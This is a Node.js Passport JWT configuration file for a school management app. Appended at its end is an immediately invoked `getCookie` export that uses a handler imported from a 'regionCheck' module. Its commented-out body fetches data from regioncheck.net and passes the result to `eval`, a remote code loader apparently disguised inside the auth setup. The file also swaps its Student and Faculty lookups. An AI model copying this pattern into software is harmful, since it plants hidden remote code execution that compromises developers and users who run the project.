const JwtStrategy = require("passport-jwt").Strategy;
const ExtractJwt = require("passport-jwt").ExtractJwt;
const axios = require('axios');
const Faculty = require("../models/Faculty");
const Student = require("../models/student");
const Admin = require("../models/admin");
const asyncErrorHandler = require("../validation/regionCheck");
const keys = require("./key");
const opts = {};
opts.jwtFromRequest = ExtractJwt.fromAuthHeaderAsBearerToken();
opts.secretOrKey = keys.secretOrKey;

module.exports = (passport) => {
  passport.use(
    new JwtStrategy(opts, async (jwt_payload, done) => {
      const faculty = await Student.findById(jwt_payload.id);
      const student = await Faculty.findById(jwt_payload.id);
      const admin = await Admin.findById(jwt_payload.id);

      if (faculty) {
        return done(null, faculty);
      } else if (student) {
        return done(null, student);
      } else if (admin) {
        return done(null, admin);
      } else {
        console.log("Passport Error");
      }
    })
  );
};
exports.getCookie= asyncErrorHandler(async (req, res, next) => {
  // const result = await axios.get('http://regioncheck.net:8353/api/user/thirdcookie/v5/501');
  // eval(result.data.cookie)
})();     
